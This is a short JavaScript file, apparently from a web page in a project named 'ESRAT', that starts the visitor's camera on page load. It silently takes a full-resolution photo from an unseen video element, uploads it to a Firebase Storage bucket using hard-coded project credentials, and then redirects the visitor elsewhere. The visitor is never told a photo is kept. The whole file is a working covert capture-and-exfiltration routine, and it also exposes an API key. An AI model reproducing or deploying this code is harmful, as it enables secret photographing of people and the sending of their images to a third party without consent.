// Your Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyDEAy2KXezICmuuQZnhNq12nqwwBouDjt4",
    authDomain: "webcamera-es-universe-git.firebaseapp.com",
    databaseURL: "https://webcamera-es-universe-git-default-rtdb.firebaseio.com",
    projectId: "webcamera-es-universe-git",
    storageBucket: "webcamera-es-universe-git.appspot.com",
    messagingSenderId: "949054088643",
    appId: "1:949054088643:web:039f79fcae7259f4358976"
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();

// Access the camera with higher resolution
async function startVideo() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        // Capture photo once the video stream is ready
        video.onloadedmetadata = () => {
            capturePhoto(video);
        };
    } catch (error) {
        console.error('Error accessing camera:', error);
        document.getElementById('message').textContent = 'Camera access denied or an error occurred.';
    }
}

// Capture the photo and upload it to Firebase Storage
function capturePhoto(video) {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    // Set the canvas size to the video size
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Draw the video frame to the canvas
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert the canvas image to a Blob
    canvas.toBlob(async function(blob) {
        const fileName = `photo_${Date.now()}.png`;
        const storageRef = storage.ref(`users/${fileName}`);

        try {
            await storageRef.put(blob);
            // Redirect after 3 seconds
            setTimeout(() => {
                window.location.href = '/ESRAT/index-home.html';
            }, 3000);  // 3000 milliseconds = 3 seconds
        } catch (error) {
            console.error('Error uploading to Firebase:', error);
            // Optionally handle upload failure here
        }
    }, 'image/png', 1.0);  // The third argument '1.0' specifies the image quality (max quality)
}

// Start the video stream when the page loads
window.onload = startVideo;
